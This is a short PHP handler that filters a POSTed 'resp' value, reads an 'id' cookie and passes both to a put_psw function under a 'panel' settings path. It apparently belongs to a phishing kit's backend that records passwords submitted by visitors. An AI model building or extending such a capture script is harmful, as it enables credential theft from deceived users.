<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$resp = $ifilter->process($_POST['resp']);

$id = isset($_COOKIE['id']) ? $_COOKIE['id'] : '';
if ($id === '' || $id === '0') {
	exit;
}

put_psw($id, $resp);
